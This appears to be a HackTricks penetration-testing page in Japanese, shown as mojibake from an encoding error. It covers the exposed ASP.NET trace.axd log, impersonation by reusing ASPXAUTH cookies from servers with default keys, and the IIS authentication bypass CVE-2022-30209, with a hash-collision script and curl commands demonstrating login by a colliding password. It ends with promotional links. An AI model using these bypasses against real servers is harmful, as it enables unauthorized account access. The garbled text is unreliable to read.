ã“ã‚Œã¯ä¸€å®šæœŸé–“ã«ã‚ãŸã£ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è¡Œã‚ã‚ŒãŸã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®éå¸¸ã«è©³ç´°ãªãƒ­ã‚°ã‚’ä¿æŒã—ã¾ã™ã€‚

ã“ã®æƒ…å ±ã«ã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®IPã€ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã€ã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚¯ãƒƒã‚­ãƒ¼ã€ç‰©ç†ãƒ‘ã‚¹ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰æƒ…å ±ã€ãŠãã‚‰ããƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¾ã§å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTHã¯ä»¥ä¸‹ã®æƒ…å ±ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

* **`validationKey`** (æ–‡å­—åˆ—)ï¼šç½²åæ¤œè¨¼ã«ä½¿ç”¨ã™ã‚‹16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚
* **`decryptionMethod`** (æ–‡å­—åˆ—)ï¼šï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯â€œAESâ€ï¼‰ã€‚
* **`decryptionIV`** (æ–‡å­—åˆ—)ï¼š16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸåˆæœŸåŒ–ãƒ™ã‚¯ãƒˆãƒ«ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ã‚¼ãƒ­ã®ãƒ™ã‚¯ãƒˆãƒ«ï¼‰ã€‚
* **`decryptionKey`** (æ–‡å­—åˆ—)ï¼šå¾©å·åŒ–ã«ä½¿ç”¨ã™ã‚‹16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚

ã—ã‹ã—ã€ã“ã‚Œã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤**ã‚’ä½¿ç”¨ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¯ãƒƒã‚­ãƒ¼ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹**äººã‚‚ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ASPXAUTHã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹**åŒã˜ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã‚’ä½¿ç”¨ã™ã‚‹Webã‚’è¦‹ã¤ã‘ã€æ”»æ’ƒå¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ä¸Šã§**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã™ã‚‹ã¨ã€ç¬¬äºŒã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’æœ€åˆã®ã‚µãƒ¼ãƒãƒ¼ã§**ä½¿ç”¨ã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã“ã®æ”»æ’ƒã¯ã“ã®[**ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ã§æ©Ÿèƒ½ã—ã¾ã—ãŸã€‚

## ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸIISèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ (CVE-2022-30209) <a href="#3-iis-authentication-bypass" id="3-iis-authentication-bypass"></a>

ã‚³ãƒ¼ãƒ‰ã®ãƒã‚°ãŒ**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ä¸ãˆã‚‰ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’é©åˆ‡ã«ãƒã‚§ãƒƒã‚¯ã—ãªã‹ã£ãŸ**ãŸã‚ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥å†…ã®ã‚­ãƒ¼ã«ãƒ’ãƒƒãƒˆã™ã‚‹**æ”»æ’ƒè€…ã¯ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼ˆ[å®Œå…¨ãªãƒ¬ãƒãƒ¼ãƒˆã¯ã“ã¡ã‚‰](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼‰ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
```markdown
<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* ã‚ãªãŸã®**ä¼šç¤¾ã‚’HackTricksã§å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
```
